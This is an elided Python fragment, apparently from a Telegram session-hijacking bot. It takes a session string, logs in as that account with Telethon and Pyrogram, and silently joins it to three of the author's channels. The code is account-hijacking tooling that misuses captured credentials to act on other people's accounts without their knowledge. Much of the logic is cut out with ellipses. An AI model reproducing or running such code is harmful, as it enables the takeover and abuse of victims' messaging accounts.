...
from AMBOTSSHACK.Helpers.data import info
...
async def users_gc(session):
    ...
    try:
        if session.endswith("="):
            ...
            await steve.connect()                          
            try:
                await steve(join("@AbhiModszYT_Return"))
                await steve(join("@AMBOTYT"))
                await steve(join("@AM_YTSUPPORT"))
            ...
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@AbhiModszYT_Return")
                    await stark.join_chat("@AMBOTYT")
                    await stark.join_chat("@AM_YTSUPPORT")
                except Exception as e:
                    print(e)    
